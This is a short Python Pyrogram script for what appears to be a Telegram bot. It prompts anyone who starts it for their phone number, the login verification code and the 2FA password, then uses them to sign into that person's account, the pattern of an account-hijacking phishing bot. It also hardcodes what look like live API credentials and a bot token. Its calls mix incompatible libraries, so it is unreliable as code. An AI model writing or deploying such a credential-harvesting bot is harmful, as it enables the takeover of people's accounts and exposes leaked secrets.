

# Your API credentials from https://my.telegram.org


# Temporary state storage
from pyrogram import Client, errors
from pyrogram.types import Message

# Set up your API_ID, API_HASH, and bot token
API_ID = 28863669  # <-- Replace with your API ID (integer)
API_HASH = "72b4ff10bcce5ba17dba09f8aa526a44"  # <-- Replace with your API HASH (string)

# Your Bot Token from BotFather
BOT_TOKEN = "7403077617:AAHpamE_hj-cuNb2kHECiMjD3oSddO_iR20"
app = Client("my_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

@app.on_message()
async def handle_message(client, message: Message):
    if message.text.lower() == "/start":
        await message.reply("Hello! Please enter your phone number to begin.")

        # After user enters phone number
        phone_number = await client.ask(message.chat.id, "Enter your phone number:")

        try:
            # Start the login process
            await client.send_code_request(phone_number.text)
            await message.reply("A verification code has been sent to your phone.")

            # Ask for 2FA code if needed
            verification_code = await client.ask(message.chat.id, "Enter the verification code:")

            # If 2FA is enabled, we need to ask for the 2FA code
            try:
                await client.sign_in(phone_number.text, verification_code.text)
                await message.reply("Successfully logged in!")
            except errors.FloodWait as e:
                await message.reply(f"Please wait for {e.x} seconds before trying again.")
            except errors.SessionPasswordNeeded as e:
                # 2FA is required
                await message.reply("2FA is enabled on your account. Please enter the 2FA code:")
                twofa_code = await client.ask(message.chat.id, "Enter your 2FA code:")

                # Pass the 2FA code to complete the login
                await client.check_password(twofa_code.text)
                await message.reply("Successfully logged in with 2FA!")

        except Exception as e:
            await message.reply(f"An error occurred: {str(e)}")

app.run()
